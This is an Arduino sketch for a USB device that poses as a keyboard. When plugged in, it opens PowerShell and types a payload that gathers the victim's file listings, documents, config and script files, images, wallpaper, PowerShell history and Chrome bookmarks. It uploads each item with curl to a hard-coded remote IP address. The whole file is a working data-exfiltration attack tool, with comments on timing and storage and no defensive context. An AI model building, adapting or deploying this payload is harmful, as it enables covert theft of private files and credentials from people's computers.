#include <Keyboard.h>

const int DELAY_BOOT     = 10000; // OS need times to recognize the device
const int DELAY_RUN_OPEN = 500;
const int DELAY_PS_OPEN  = 2000;  // PowerShell is slow to load and this makes sure that the payload doesn't type before it opens
const int DELAY_CHAR     = 5;     // If it types too fast you get keys that are dropped so you add a bit of a delay

// PROGMEM keeps the string in flash instead of SRAM .
const char payload[] PROGMEM =
  "$s='http://137.184.156.162:8080';"
  "$h='X-Auth: 06a3111a4b61f5ea2959f7a8207547fc';"
  "$p=@(\"$env:USERPROFILE\\Desktop\",\"$env:USERPROFILE\\Documents\","
  "\"$env:USERPROFILE\\Downloads\",\"$env:USERPROFILE\\Pictures\","
  "\"$env:USERPROFILE\\OneDrive\");"

  // Dirs
  "foreach($d in $p){"
  "$l=Get-ChildItem -Path $d -Recurse -ErrorAction SilentlyContinue"
  "|Select-Object -ExpandProperty FullName;"
  "if($l){$b=$l -join \"`n\";"
  "curl.exe -X POST \"$s/upload/dirs\" -H \"Content-Type: text/plain\" -H \"$h\" --data-binary \"$b\"}};"

  // Text files
  "foreach($d in $p){"
  "Get-ChildItem -Path $d -Include *.txt,*.log,*.csv,*.xml,*.json,*.ini,*.bat,*.ps1,*.rdp -Recurse -ErrorAction SilentlyContinue"
  "|Where-Object{$_.Length -lt 1MB}"
  "|ForEach-Object{"
  "$c=$_.FullName+\"`n\"+(Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue);"
  "Set-Content -Path \"$env:TEMP\\t.txt\" -Value $c -Encoding utf8;"
  "curl.exe -X POST \"$s/upload/files\" -H \"Content-Type: text/plain\" -H \"$h\" --data-binary \"@$env:TEMP\\t.txt\"}};"

  // Images
  "foreach($d in $p){"
  "Get-ChildItem -Path $d -Include *.jpg,*.jpeg,*.png,*.webp,*.bmp,*.gif -Recurse -ErrorAction SilentlyContinue"
  "|Where-Object{$_.Length -lt 5MB}"
  "|ForEach-Object{"
  "$b64=[Convert]::ToBase64String([IO.File]::ReadAllBytes($_.FullName));"
  "$body=$_.FullName+\"`n\"+$b64;"
  "Set-Content -Path \"$env:TEMP\\t.txt\" -Value $body -Encoding utf8;"
  "curl.exe -X POST \"$s/upload/image\" -H \"Content-Type: text/plain\" -H \"$h\" --data-binary \"@$env:TEMP\\t.txt\"}};"

  // Wallpaper
  "$w=\"$env:APPDATA\\Microsoft\\Windows\\Themes\\TranscodedWallpaper\";"
  "if(Test-Path $w){"
  "$wb=[Convert]::ToBase64String([IO.File]::ReadAllBytes($w));"
  "$wbody=\"WALLPAPER`n\"+$wb;"
  "Set-Content -Path \"$env:TEMP\\t.txt\" -Value $wbody -Encoding utf8;"
  "curl.exe -X POST \"$s/upload/wallpaper\" -H \"Content-Type: text/plain\" -H \"$h\" --data-binary \"@$env:TEMP\\t.txt\"};"

  // PowerShell command history
  "$ps=\"$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt\";"
  "if(Test-Path $ps){"
  "$c=$ps+\"`n\"+(Get-Content $ps -Raw);"
  "Set-Content -Path \"$env:TEMP\\t.txt\" -Value $c -Encoding utf8;"
  "curl.exe -X POST \"$s/upload/files\" -H \"Content-Type: text/plain\" -H \"$h\" --data-binary \"@$env:TEMP\\t.txt\"};"

  // Chrome bookmarks
  "$bk=\"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Bookmarks\";"
  "if(Test-Path $bk){"
  "$c=$bk+\"`n\"+(Get-Content $bk -Raw);"
  "Set-Content -Path \"$env:TEMP\\t.txt\" -Value $c -Encoding utf8;"
  "curl.exe -X POST \"$s/upload/files\" -H \"Content-Type: text/plain\" -H \"$h\" --data-binary \"@$env:TEMP\\t.txt\"}";

// The Arduino has separate address spaces for flash and SRAM which means that it 
// can't dereference a PROGMEM pointer normally  which is why you use pgm_read_byte_near, because it
// fetches one byte from flash at a given offset
void typeFromProgmem(const char* progmemStr) {
  char c;
  unsigned int i = 0;
  while ((c = pgm_read_byte_near(progmemStr + i)) != '\0') {
    Keyboard.print(c);
    delay(DELAY_CHAR);
    i++;
  }
}

void setup() {
  delay(DELAY_BOOT);
  Keyboard.begin();

  // presses Win + R to open the run thingy
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(DELAY_RUN_OPEN);

  Keyboard.print("powershell");
  delay(100);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(DELAY_PS_OPEN);

  typeFromProgmem(payload);
  delay(100);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  // keyboard stops 
  Keyboard.end();
}

// Runs once on plugin intentionally empty
void loop() {}